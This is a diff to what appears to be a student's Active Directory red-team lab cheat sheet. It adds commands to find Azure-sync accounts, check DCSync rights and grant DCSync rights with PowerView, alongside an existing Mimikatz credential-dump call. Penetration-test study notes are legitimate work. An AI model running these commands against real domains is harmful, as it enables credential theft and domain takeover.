@@ -25,7 +25,6 @@ nbtscan -r $SUBNET/$MASK
 ## Find names and workgroup from an IP address
 nmblookup -A $IPAdress
 
-
 # Domain Recon
 
 ## Forest and Trusts
@@ -46,6 +45,9 @@ Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
 
 Find-DomainUserLocation –Stealth / Find-DomainUserLocation -CheckAccess
 
+## Get AD on-prem computer which sync with azure
+
+Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
 
 # Domain Delegation
 
@@ -172,3 +174,18 @@ sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.d
 winrs -r:us-dc.us.techcorp.local cmd
 
 Invoke-Mimi -Command '"lsadump::lsa /patch"'
+
+
+# DCSync
+Check if studentuser72 has dcsync rights
+Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser72"}
+
+
+
+
+# Rights manipulation 
+## add dcsync rights to studentuserx with powerview 
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuserx -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
+
+## add dcsync rights with ADmodule
+Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose
